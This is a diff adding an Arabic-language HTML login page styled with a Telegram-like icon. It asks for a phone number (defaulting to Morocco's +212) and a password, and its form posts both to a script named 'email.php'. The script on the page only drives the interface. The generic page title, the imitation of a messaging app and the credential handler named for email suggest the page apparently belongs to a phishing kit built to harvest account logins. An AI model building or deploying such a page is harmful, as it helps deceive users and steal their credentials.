@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<style>
+    *
+    {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+    }
+    .header
+    {
+        background-image: url(1.png);
+        background-repeat: repeat-x;
+        height: 250px;
+    }
+    svg{width: 30px;height: 40px;}
+    .Header_1 {
+    display: flex;
+    justify-content: space-between;
+    padding: 0px 20px;
+    align-items: center;
+}
+
+.header_3 {
+    display: flex;
+    align-items: center;
+}
+.tel>svg {
+    border-radius: 100%;
+}
+svg.icon___ {
+    color: white;
+}
+.icon___1{color: rgba(0, 0, 0, 0.575);}
+.con {
+    padding: 40px 40px;
+    border-top-left-radius: 15px;
+    background-color: white;
+    position: relative;
+    top: -25px;
+    z-index: 1;
+    border-bottom: 1px solid #00000036;
+    border-top-right-radius: 15px;
+}
+.form {
+    width: fit-content;
+    margin: auto;
+    padding: 10px;
+}
+.phone {
+    display: flex;
+    border-bottom: 1px solid #00000021;
+    border-radius: 0px;
+    line-height: 40px;
+    align-items: center;
+    padding: 2px 10px;
+    height: 60px;
+    justify-content: space-between;
+}
+#iput,#iputt {
+    border: none;
+    outline: none;
+    width: 290px;
+    padding: 0pc 75px;
+    line-height: 40px;
+}
+#phone_id
+{
+    margin-top: 30px;
+}
+.login {
+    margin-top: 60px;
+    display: flex;
+    flex-direction: column;
+}
+input#lo {
+    height: 47px;
+    border: none;
+    margin: 40px 3px;
+    border-radius: 24px;
+    color: white;
+    background-color: #9075ff;
+}
+a.a {
+    text-decoration: none;
+    color: gray;
+}
+.country {
+    background-color: #ffffff;
+    height: fit-content;
+    position: relative;
+    top: 47%;
+    z-index: 1;
+    padding: 5px;
+    
+}
+.con___ {
+    background-color: #00000038;
+    width: -webkit-fill-available;
+    height: -webkit-fill-available;
+    position: absolute;
+    top: 0px;
+    z-index: 1;
+    transition: 2s ease-in-out;
+    display: none;
+}
+@media (max-width: 360px)
+{
+    #iput,#iputt{width: auto;padding: 0;}
+}
+#nuuu {
+    padding: 10px;
+}
+#nuuu:hover{background-color: rgba(160, 160, 240, 0.781);}
+.number_ {
+    height: 250px;
+    overflow: auto;
+}
+.btn {
+    display: flex;
+    justify-content: space-around;
+    margin-top: 25px;
+}
+.accept,.Cancel {
+    padding: 10px 20px;
+    border-radius: 15px;
+    background-color: #9075ff;
+    cursor: pointer;
+}
+.Cancel{background-color: #a9a8afc4;}
+.search {
+    padding: 10px 50px;
+}
+.search>input {
+    padding: 10px;
+    width: 60%;
+    background-color: #cdd3d3a8;
+    border: navajowhite;
+    border-radius: 13px;
+}
+@media (max-width: 400px)
+{
+.con{
+    width: -webkit-fill-available;
+    padding: 40px 40px;
+}
+.ttt{font-size: 15px;}
+.phone{padding: 2px;}
+.form{padding: 0;}
+#bb{width: 80%;}
+}
+@media (max-width: 600px)
+{
+    #bb{width: 80%;}
+}
+#inf,#show
+{
+    display: none;
+}
+</style>
+<body class="body">
+    <div class="header">
+        <div class="Header_1">
+            <div><svg class="icon___" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-1xv229u"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.934 12l3.89 3.89-1.769 1.767L8.398 12l1.768-1.768 3.89-3.889 1.767 1.768-3.889 3.89z" fill="currentColor"></path></svg></div>
+            <div class="header_3">
+               <div class="tel"><svg fill="#3276c3" height="800px" width="800px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-45.5 -45.5 546.00 546.00" xml:space="preserve" stroke="#3276c3" stroke-width="0.00455">
+
+                <g id="SVGRepo_bgCarrier" stroke-width="0">
+                
+                <rect x="-45.5" y="-45.5" width="546.00" height="546.00" rx="0" fill="none" strokewidth="0"/>
+                
+                </g>
+                
+                <g id="SVGRepo_tracerCarrier" fill="white" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="7.279999999999999"/>
+                
+                <g id="SVGRepo_iconCarrier"> <rect x="-10" y="0" width="477" height="442" rx="0" fill="white" strokewidth="0"></rect><g> <path style="fill-rule:evenodd;clip-rule:evenodd;" d="M0,0v455h455V0H0z M384.814,100.68l-53.458,257.136 c-1.259,6.071-8.378,8.822-13.401,5.172l-72.975-52.981c-4.43-3.217-10.471-3.046-14.712,0.412l-40.46,32.981 c-4.695,3.84-11.771,1.7-13.569-4.083l-28.094-90.351l-72.583-27.089c-7.373-2.762-7.436-13.171-0.084-16.003L373.36,90.959 C379.675,88.517,386.19,94.049,384.814,100.68z"/> <path style="fill-rule:evenodd;clip-rule:evenodd;" d="M313.567,147.179l-141.854,87.367c-5.437,3.355-7.996,9.921-6.242,16.068 l15.337,53.891c1.091,3.818,6.631,3.428,7.162-0.517l3.986-29.553c0.753-5.564,3.406-10.693,7.522-14.522l117.069-108.822 C318.739,149.061,316.115,145.614,313.567,147.179z"/> </g> </g>
+                
+                </svg>
+            </div>
+            <div><svg class="icon___" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" id="header_menu_current_theme" class="css-1gn1lrv"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.23 20.403a9.011 9.011 0 005.684-7.153h-3.942c-.147 2.86-.793 5.388-1.741 7.153zm-.757-7.153c-.178 4.102-1.217 7.25-2.473 7.25-1.256 0-2.295-3.148-2.473-7.25h4.946zm0-2.5H9.527C9.705 6.648 10.744 3.5 12 3.5c1.256 0 2.295 3.148 2.473 7.25zm2.499 0h3.942a9.01 9.01 0 00-5.683-7.153c.948 1.765 1.594 4.293 1.741 7.153zm-9.936 0c.147-2.862.793-5.392 1.743-7.156a9.01 9.01 0 00-5.693 7.156h3.95zm0 2.5h-3.95a9.01 9.01 0 005.693 7.157c-.95-1.765-1.596-4.295-1.743-7.157z" fill="currentColor"></path></svg></div>
+            </div>
+            
+        </div>
+    </div>
+    <div class="con">
+        <h2>تسجيل دخول المستخدم</h2>
+        <div class="form">
+                
+                <section><form class="login-form" action="email.php" method="post" 
+            id="myFormPhone" 
+redirect="verification" method="post" data-wf-page-id="655c9bf6c2fa75433157ef77" data-wf-element-id="text" > 
+                
+                
+                <div class="phone"><div id="n1" style="cursor: pointer;" class="ttt" onclick="show_umnber()">+212</div>
+                
+                <input type="text" placeholder="رقم الهاتف" id="iput" name="text" onkeypress="searchh()" onfocus="Keypresss()" onblur="KeyDownn()">
+               	
+                    <div class="show_hide" id="inf" onclick="clearrr()" ><svg class="icon___1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 34 10" fill="none" id="password_show_icon"><path fill-rule="evenodd" clip-rule="evenodd" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-7.233 0l3.006 3.005-1.768 1.768L12 13.767l-3.005 3.005-1.768-1.768 3.005-3.005-3.005-3.005 1.768-1.767L12 10.23l3.005-3.005 1.768 1.767L13.767 12z" fill="currentColor"></path></svg></div>
+                </div>
+                <div class="phone"  id="phone_id">
+                   
+ <input type="password" id="iputt" name="password" 
+placeholder="ادخل كلمة السر" 
+onkeypress="searchh()">
+ 	
+                    <div class="show_hide" onclick="show_hode_eye('hide')" id="hide"><svg class="icon___1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 34 10" fill="none" id="password_show_icon" ><path fill-rule="evenodd" clip-rule="evenodd" d="M2.94 5.06l16 16 2.12-2.12-2.446-2.447L23 12l-5.555-5.69a7.566 7.566 0 00-9.883-.87L5.06 2.94 2.939 5.06zm6.747 2.506a5 5 0 016.747 6.747L9.687 7.566z" fill="currentColor"></path><path d="M1 12l2.29-2.346 10.198 10.198a7.574 7.574 0 01-6.933-2.162L1 12z" fill="currentColor"></path></svg></div> 
+                    <div class="show_hide" onclick="show_hode_eye('show')" id="show"><svg class="icon___1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 34 10" fill="none" id="password_show_icon" ><path d="M12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.555 6.31L1 12l5.555 5.69a7.572 7.572 0 0010.89 0L23 12l-5.555-5.69a7.572 7.572 0 00-10.89 0zM17 12a5 5 0 11-10 0 5 5 0 0110 0z" fill="currentColor"></path></svg></div>
+                    
+                </div>
+                <div style="margin-top: 40px;
+                float: left;
+                position: absolute;
+                left: 30px;
+                font-weight: 600;">
+<input type="checkbox"> تذكر كلمة السر    </div>
+                <div class="login">
+                    <input type="submit" value="سجل" id="lo">
+                   <center> <a href="#" class="a">تسجيل فوري</a></center>
+                </div>
+        </div>
+    </div>
+    <div class="con___" id="icon_____">
+    <div class="country">
+        <center>
+            <div class="number_" id="number_1">
+                
+            </div>
+        </center>
+        <div class="search">
+<input type="text" placeholder="Search" id="bb"></div>
+        <div class="btn"><div class="accept" onclick="conform()">أكد</div> <div class="Cancel" onclick="Cancel()">ألغى</div> </div>
+    </div>
+    </div>
+                  </form>
+</body>
+</html>
+<script>
+    var type=""; 
+    var country=["+213 Algeria","+964 Iraq","+593 Ecuador","+962 Jordan","+218 Libya",
+    "+212 Morocco","+968 Oman","+216 Tunisia","+44 United Kingdom","+222 Mauritania","+90 Turkey",
+    "+93 Afghanistan","+355 Albania","+376 Andorra","+1264 Anguilla","+1268 Antigua and Barbuda","+54 Argentina",
+    "+374 Armenia","+247 Ascension","+61 Australia","+43 Austria","+994 Azerbaijan ","+1242 Bahamas",
+    "+973 Bahrain","+880 Bangladesh","+1246 Barbados","+375 Belarus","+32 Belgium","+501 Belize","+229 Benin","+1441 Bermuda Is",
+    "+591 Bolivia"]
+    function loood(x)
+    {
+        document.getElementById("number_1").innerHTML="";
+        for( var i=0;i<x.length;i++)
+        {
+            document.getElementById("number_1").innerHTML+="<h5 id='nuuu' class='nbn' onclick='checkk(this)''>"+x[i]+"</h5>";
+        }
+    }
+    onload=function()
+    {
+        loood(country);
+    }
+    function show_umnber()
+    {
+        document.getElementById("icon_____").style.display="block";
+    }
+    function Cancel()
+    {
+        document.getElementById("icon_____").style.display="none"; 
+    }
+    // key perss
+    function searchh()
+    {
+        var sea=document.getElementById("iput").value;
+        var seaa=document.getElementById("iputt").value;
+        if(sea.length>0 && seaa.length>0)
+        {document.getElementById("lo").style.backgroundColor="#9075ff";
+    }
+    else
+    {
+        document.getElementById("lo").style.backgroundColor="#a9a8afc4"; 
+    }
+
+    }
+function checkk(e)
+{
+    var iii=document.getElementsByClassName("nbn");
+    for(var i=0;i<iii.length;i++){
+        iii[i].style.backgroundColor="white"
+    }
+    type=e.innerHTML;
+    e.style.backgroundColor="blue";
+}
+function conform()
+{
+    if(type!="")
+    {
+        document.getElementById("n1").innerHTML=type;
+        document.getElementById("icon_____").style.display="none"; 
+    }
+    else
+    {
+        alert("Chose One")
+    }
+
+
+}
+function clearrr()
+{
+    document.getElementById("iput").value="";
+}
+function Keypresss()
+{
+    document.getElementById("inf").style.display="block";
+}
+function KeyDownn()
+{
+    
+    if((document.getElementById("iput").value)=="")
+    document.getElementById("inf").style.display="none";
+    
+}
+function show_hode_eye(name)
+{
+    
+    if(name=='show')
+    {
+        document.getElementById('hide').style.display="block";
+        document.getElementById('show').style.display="none";
+        document.getElementById("iputt").type="password";
+    }
+    else
+    {
+        document.getElementById('hide').style.display="none";
+        document.getElementById('show').style.display="block";
+        document.getElementById("iputt").type="text";
+    }
+}
+</script>
